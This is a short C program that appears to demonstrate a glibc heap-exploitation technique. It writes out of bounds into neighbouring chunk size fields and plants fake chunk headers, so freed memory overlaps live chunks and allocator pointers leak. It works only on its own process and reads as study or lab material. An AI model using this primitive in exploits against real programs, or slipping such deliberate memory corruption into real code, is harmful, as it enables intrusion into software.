#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef uint64_t u64;

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    u64 *a = malloc(0x18);
    u64 *b = malloc(0x1000-8);
    u64 *c = malloc(0x1000-8);
    malloc(0);

    u64 *d = malloc(0x18);
    u64 *e = malloc(0x1000-8);
    u64 *f = malloc(0x1000-8);
    malloc(0);

    memset(c, 0x41, 0x1000-8);
    c[4-2] = 0x1020;
    c[4-1] = 0x20;

    memset(f, 0x41, 0x1000-8);
    f[4-2] = 0x1020;
    f[4-1] = 0x20;


    free(e);
    free(b);

    malloc(0x2000);

    a[3] = 0x1020 | 1;
    d[3] = 0x1020 | 1;

    // asm volatile("int3");

    malloc(0x1000-8);
    malloc(0x1000-8);
    malloc(0x100);

    printf("c = %s\n", c);
    printf("c[0] = %p\n", c[0]);
    printf("c[1] = %p\n", c[1]);
    printf("f[0] = %p\n", f[0]);
    printf("f[1] = %p\n", f[1]);

    asm volatile("int3");
}